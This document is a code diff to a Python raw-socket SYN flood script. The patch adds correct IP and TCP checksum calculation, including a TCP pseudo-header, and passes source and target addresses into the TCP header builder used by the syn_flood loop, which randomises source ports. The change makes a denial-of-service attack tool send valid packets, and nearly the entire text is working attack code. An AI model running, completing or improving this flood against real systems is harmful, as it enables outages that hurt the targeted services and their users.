@@ -31,12 +31,18 @@ def create_ip_header(src_ip, dst_ip):
 
     ip_header = struct.pack('!BBHHHBBH4s4s',
                             ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
-                            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)         # Construct the IP header
+                            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
 
+    # Calculate the checksum for the IP header
+    ip_check = checksum(ip_header)
+    ip_header = struct.pack('!BBHHHBBH4s4s',
+                            ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
+                            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
+    
     return ip_header
 
 
-def create_tcp_header(src_port, dst_port):
+def create_tcp_header(src_port, dst_port, src_ip, dst_ip):
     tcp_source = src_port
     tcp_dest = dst_port
     tcp_seq = 0     # sequence number (not used here)
@@ -57,7 +63,25 @@ def create_tcp_header(src_port, dst_port):
 
     tcp_header = struct.pack('!HHLLBBHHH',
                              tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
-                             tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)   # Construct the TCP header
+                             tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)     # Construct the TCP header
+
+    # Pseudo header fields for checksum calculation
+    placeholder = 0
+    protocol = socket.IPPROTO_TCP
+    tcp_length = len(tcp_header) 
+
+    # Pseudo header for checksum calculation
+    pseudo_header = struct.pack('!4s4sBBH',
+                                socket.inet_aton(src_ip), socket.inet_aton(dst_ip), placeholder, protocol, tcp_length) # Construct the pseudo-header
+
+    # Combine pseudo-header, TCP header, and any payload for checksum calculation
+    psh = pseudo_header + tcp_header
+    tcp_check = checksum(psh)
+
+    # Re-pack TCP header with the correct checksum
+    tcp_header = struct.pack('!HHLLBBHHH',
+                             tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
+                             tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)    # Construct the TCP header again with the correct checksum
 
     return tcp_header
 
@@ -74,7 +98,7 @@ def syn_flood(s: socket.socket,target_ip, target_port, num_packets, iterations):
                 src_port = random.randint(1024, 65535)
 
                 ip_header = create_ip_header(src_ip, target_ip)
-                tcp_header = create_tcp_header(src_port, target_port)
+                tcp_header = create_tcp_header(src_port, target_port, src_ip, target_ip)
 
                 packet = ip_header + tcp_header   # Construct the packet from the IP and TCP headers
 
